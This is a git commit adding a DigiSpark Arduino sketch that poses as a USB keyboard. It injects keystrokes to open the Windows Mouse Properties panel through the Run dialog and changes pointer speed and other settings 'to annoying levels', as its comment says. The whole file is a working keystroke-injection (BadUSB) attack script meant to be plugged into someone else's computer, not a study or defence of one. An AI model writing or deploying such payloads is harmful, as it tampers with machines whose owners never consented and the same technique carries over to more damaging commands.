2aa1b668c14ebe590438f693e3eda3078e361a7f
mariagarciasanchez <100581117+mariagarciasanchez@users.noreply.github.com>
2022-12-18 15:48:51 +0100

    Add files via upload

---
+++ Mouse_Code.ino
@@ -0,0 +1,91 @@
+
+//This DigiSpark script changes mouse settings to annoying levels
+//This code move the mouse so slowly and change it direction and also the speed.
+
+
+#include "DigiKeyboard.h"
+void setup() {
+  #define KEY_TAB 43
+  #define KEY_ARROW_RIGHT 0x4F
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("main.cpl");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("100");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for(;;){ /*empty*/ }
+}
